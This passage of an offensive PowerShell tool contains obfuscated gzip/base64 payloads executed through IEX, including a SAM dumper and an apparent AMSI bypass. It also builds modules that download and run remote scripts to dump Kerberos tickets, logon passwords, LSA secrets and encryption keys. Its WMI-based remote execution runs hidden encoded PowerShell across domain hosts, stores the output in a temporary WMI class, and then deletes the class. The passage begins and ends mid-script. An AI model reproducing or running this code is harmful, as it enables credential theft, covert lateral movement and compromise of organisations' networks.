$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk", "*.tmp")
$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")

foreach ($user in $users) {
    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
    $userHome = $user.FullName

    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue

    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }

    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0

    if ($hasFiles) {
        Write-Output ""
        Write-Output "----------------------------------------------------------------------------------------------"
        Write-Output ("[User] $user")
        Write-Output

        if ($downloadsFiles.Count -gt 0) {
        ""
            Write-Output ("[Downloads]")
            $downloadsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Output ("- $($_.Name) ($fileSize)")
            }
        }

        if ($documentsFiles.Count -gt 0) {
        ""
            Write-Output
            Write-Output ("[Documents]")
            $documentsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Output ("- $($_.Name) ($fileSize)")
            }
        }

        if ($desktopFiles.Count -gt 0) {
        ""
            Write-Output
            Write-Output ("[Desktop]")
            $desktopFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Output ("- $($_.Name) ($fileSize)")
            }
        }

        if ($homeFiles.Count -gt 0) {
        ""
            Write-Output
            Write-Output ("[Home]")
            $homeFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Output ("- $($_.Name) ($fileSize)")
            }
        }
        Write-Output "----------------------------------------------------------------------------------------------"
    }
}
'@
}

$LocalSAM = @'
function DumpSAM{$gz="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";$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$c=New-Object System.IO.MemoryStream;$b.CopyTo($c);$d=[System.Text.Encoding]::UTF8.GetString($c.ToArray());$b.Close();$a.Close();$c.Close();$d|IEX}DumpSAM
'@

$Mongoose = @'
Function Invoke-Mongoose{$gz="H4sIAAAAAAAEACVQ30vDMBB+F/wfQhhcytqydeqDPlXMRmHK3NrhFCHdzEYh7dSm4iz5373L+pDcfc33426ldB5lVumaCQZrGEK5BDZkDLKUbgFbI2/HiH8lEDCPdK/Y/lIXIOkt33zKd8EY78euHzkeTWEKIXxLoAf46o7hJ+iYaRv9lN+ZStX9XBIoYPyMaknhxeHvxZNYtC7nWMQ8VW2rZL01Jx7zmcxVvlELzYX3u3H9xJHrlesT8u6vHWfRXkBhK1Q1EISQQiggrbFtK+wFxI9lQ3MeNJ61ptrG/k9H5ZHQ0lbHhkBoib46tRZhXZ+HxlwHpe1eVdI8cEFzcHJPKMw5QEkq3hA+SCHDvqnslIwro71O6IdIfPyRn2Pi2biUFSUpLdEroj8dKeai2xq8vOoOV7wLaVuYppUqV7iyQlKaQd+oYm5cOOitWnbSseDy4h/XHGik6QEAAA=="
$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::deCOmPreSs);$c=New-Object System.IO.MemoryStream;$b.COpYTo($c);$d=[System.Text.Encoding]::UTF8.GETSTrIng($c.ToArray());$b.ClOse();$a.ClosE();$c.cLose();$d|IEX}"";Invoke-Mongoose
'@


################################################################################################################
######################################## Command and Module logic ## ###########################################
################################################################################################################

# Tickets
if ($Module -eq "Tickets"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Tickets - KerbDump
if ($Module -eq "KerbDump"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"")"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# LogonPasswords
elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# eKeys
elseif ($Module -eq "ekeys"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# LSA
elseif ($Module -eq "LSA"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# SAM
elseif ($Module -eq "SAM"){
$b64 = "$LocalSAM"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Disks
elseif ($Module -eq "disks"){
$b64 = 'Get-Volume | Where-Object { $_.DriveLetter -ne "" -and $_.FileSystemLabel -ne "system reserved" } | Select-Object DriveLetter, FileSystemLabel, DriveType, @{Name="Size (GB)";Expression={$_.Size / 1GB -replace "\..*"}} | FL'
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# LoggedOnUsers
elseif ($Module -eq "LoggedOnUsers"){
$b64 = "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName; Write-Host"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Sessions
elseif ($Module -eq "Sessions"){
$b64 = "Write-host; query user | Out-String"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# ConsoleHistory
elseif ($Module -eq "ConsoleHistory"){
$b64 = "$ConsoleHostHistory"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Files
elseif ($Module -eq "Files"){
$b64 = "$Files"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

elseif ($Module -eq "" -and $Option -eq "" -and $Command -ne ""){
$base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
$Command = "powershell.exe -ep bypass -enc $base64Command"
}


################################################################################################################
################################# Logic to help keep output tidy and even ######################################
################################################################################################################

$NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
$OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum


################################################################################################################
################################################ Function: WMI #################################################
################################################################################################################
Function Method-WMIexec {
Write-host

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList


$scriptBlock = {
    param ($computerName, $Command, $Username, $Password, $LocalAuth)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect"}
    
    Function LocalWMI {

param (
    [string]$Command = "",
    [string]$Username = "",
    [string]$Password = "",
    [string]$ComputerName = "",
    [switch]$LocalAuth = $true,
    [string]$Class = "PMEClass"
)

$LocalUsername = "$ComputerName\$UserName"
$LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($LocalUsername,$LocalPassword)
$osInfo = $null

if ($Command -eq ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue" -Credential $cred
    if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
}


#Check access
$ErrorActionPreference = "silentlycontinue"
$osInfo = $null  # Reset $osInfo variable before each iteration

# OSinfo
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -Credential $Cred

# If OSinfo true and command empty
if ($osinfo -and $Command -eq ""){
$result =  "Reminder to move this outside of runspace"
return $result

}

# If OSinfo true and command not empty
elseif ($osinfo -and $Command -ne ""){

if ($LocalAuth){	
	function CreateScriptInstance([string]$ComputerName, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred
    
    if (!$classCheck) {Write-Host "ClassCheck"
$Code = "CgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACIAXABcACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQBcAHIAbwBvAHQAXABjAGkAbQB2ADIAIgAsAFsAcw
B0AHIAaQBuAGcAXQA6ADoARQBtAHAAdAB5ACwAJABuAHUAbABsACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAFsAIgBfAF8AQwBMAEEAUwBTACIAXQAgAD0AIAAiAFAATQBFAEMAbABhAHMAcwAiAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFEAdQBhAGwAaQBmAGkAZQByAHMALgBBAGQAZAAoACIAUwB0AGEAdABpAGMAIgAs
ACQAdAByAHUAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMALgBBAGQAZAAoACIAQwBvAG0AbQBhAG4AZABJAGQAIgAsAFsAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQwBpAG0AVAB5AHAAZQBdADoAOgBTAHQAcgBpAG4AZwAsACQAZgBhAGwAcwBlACkACgAgACAAIAAgAC
QAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACIAQwBvAG0AbQBhAG4AZABJAGQAIgBdAC4AUQB1AGEAbABpAGYAaQBlAHIAcwAuAEEAZABkACgAIgBLAGUAeQAiACwAJAB0AHIAdQBlACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwAuAEEAZABkACgAIgBDAG8AbQBtAGEA
bgBkAE8AdQB0AHAAdQB0ACIALABbAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEMAaQBtAFQAeQBwAGUAXQA6ADoAUwB0AHIAaQBuAGcALAAkAGYAYQBsAHMAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAdQB0ACgAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgA="


$CommandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $Code"
    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred



# Required, if we proceed to quickly the class will not register and cause a break. Should probably loop this so we can move on as soon as the class is created
Start-Sleep -Seconds "10"
    
    }
    elseif ($classCheck -ne $null){
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred

    
    $wmiInstance.GetType() | Out-Null
    $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
    $wmiInstance.Dispose()
    return $CommandId
    }
}

$Commandid = CreateScriptInstance $ComputerName $cred $Class $LocalAuth


function GetScriptOutput([string]$ComputerName, [string]$CommandId, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    try {
            $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'" -Credential $cred 
        
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {
        Write-Host "Failed"
        #Write-Error $_.Exception.Message
    } 
    finally {
        if ($wmiInstance) {
            $wmiInstance.Dispose()
        }
    }
}

function ExecCommand([string]$ComputerName, [string]$Command, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
    
    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred
 
    if ($process.ReturnValue -eq 0) {
        $started = Get-Date
        Do {
            if ($started.AddMinutes(2) -lt (Get-Date)) {
                Write-Host "PID: $($process.ProcessId) - Response took too long."
                break
            }
    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred
            
            Start-Sleep -Seconds 1
        } While ($watcher -ne $null)
        $scriptOutput = GetScriptOutput $ComputerName $ScriptCommandID $cred $Class $LocalAuth
        return $scriptOutput
    }
}

$commandString = $Command
$scriptCommandId = CreateScriptInstance $ComputerName $cred $Class $LocalAuth
if ($scriptCommandId -eq $null) {
    Write-Host "Script Command ID Failed" -ForegroundColor "Red"
}
$encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
$result = ExecCommand $ComputerName $encodedCommand $Cred $Class $LocalAuth
$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"  -Credential $cred
Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName  -Credential $cred
return $result
}



}

elseif (!$osinfo){
    if ($SuccessOnly){return} 
        elseif (!$SuccessOnly) {

               return "Access Denied"
            }
        }
}
    if ($LocalAuth) {return LocalWMI -Username $Username -Password $Password -ComputerName $computerName -Command $Command}
    
    Function WMI {

param (
  [string]$Command = "",
  [string]$ComputerName,
  [string]$Class = "PMEClass"
)

$osInfo = $null
if ($Command -eq ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinu"
    if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
}

function CreateScriptInstance([string]$ComputerName) {
        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
        if ($classCheck -eq $null) {
            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
            $newClass["__CLASS"] = "$Class"
            $newClass.Qualifiers.Add("Static",$true)
            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
            $newClass.Put() | Out-Null
        }
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
        $wmiInstance.GetType() | Out-Null
        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
        $wmiInstance.Dispose()
        return $CommandId
        
    }

function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
    try {
        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {Write-Error $_.Exception.Message} 
    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
}


    function ExecCommand([string]$ComputerName, [string]$Command) {
        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
        if ($process.ReturnValue -eq 0) {
            $started = Get-Date
            Do {
                if ($started.AddMinutes(2) -lt (Get-Date)) {
                    Write-Host "PID: $($process.ProcessId) - Response took too long."
                    break
                }
                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                Start-Sleep -Seconds 1
            } While ($watcher -ne $null)
            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
            return $scriptOutput
        }
    }

    $commandString = $Command
    $scriptCommandId = CreateScriptInstance $ComputerName
    if ($scriptCommandId -eq $null) {
        Write-Error "Error creating remote instance."
    }
    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
    $result = ExecCommand $ComputerName $encodedCommand
    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
    return $result

    

}
    if (!$LocalAuth) {return WMI -ComputerName $computerName -Command $Command}

}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix "WMI"
    Write-Host "WMI " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline

     # Attempt to resolve the IP address
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping 
        $Result = $Ping.Send($ComputerName, 10)

        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
    
        else {Write-Host ("{0,-16}" -f "") -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

# Create and invoke runspaces for each computer
# Filter non-candidate systems before wasting processing power on creating runspaces
foreach ($computer in $computers) {
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]


        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth)
        $runspace.RunspacePool = $runspacePool

        [void]$runspaces.Add([PSCustomObject]@{
            Runspace = $runspace
            Handle = $runspace.BeginInvoke()
            ComputerName = $ComputerName
            OS = $OS
            Completed = $false
        })
    }




# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            

            if ($result -eq "Access Denied"){
            if ($successOnly){continue}
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue

}
           
